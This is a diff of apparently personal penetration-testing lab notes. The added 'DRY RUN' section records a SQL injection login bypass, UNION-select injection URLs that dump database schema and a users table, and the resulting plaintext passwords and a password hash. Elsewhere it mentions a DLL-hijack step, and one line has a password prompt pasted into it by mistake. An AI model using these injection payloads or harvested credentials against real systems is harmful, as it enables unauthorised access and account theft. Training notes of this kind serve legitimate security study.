@@ -25,6 +25,10 @@ Lin-ops
 Win-ops
 192.168.65.10, 10.50.33.144
 
+DRY RUN
+10.50.43.80
+
+
 
 Penetration Testing
 _______________________________________________________________________________________________________________________
@@ -316,7 +320,8 @@ POP Pops one off the top
 CMP compares by subtracting them and setting the %RFLAGS register. ZeroFlag set means they are the same
 JMP jump to specific location
 JLE Jump if less than
-JE Jump if equal
+JE Jump if equalwebuser@192.168.28.181's password: 
+
 JNZ Jump if not zero
 
 
@@ -746,6 +751,52 @@ run
 
 send hijackmeplz.dll to the memorystatus 
 restart windows
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+DRY RUN
+______________________________________
+when siging in with tom' or 1='1 it says welcome Aaron
+can upload files
+  5 system_user=user2
+  6 user_password=EaglesIsARE78
+192.168.28.181 WebApp
+
+http://127.0.0.1:1999/pick.php?product=7%20UNION%20select%20table_schema,column_name,5%20from%20information_schema.columns;#
+http://127.0.0.1:1999/pick.php?product=7%20UNION%20select%20name,2,3%20from%20siteusers.users%20#
+
+name  user_id            
+user3 Bob4THEEapples
+Aaron apasswordyPa$$word
+Lroth anotherpassword4THEages
+webuser *BF207353FF1EAA9EBA7DD87E37E6D278746F17CD
+
+
+
+
+
+
 
 
 
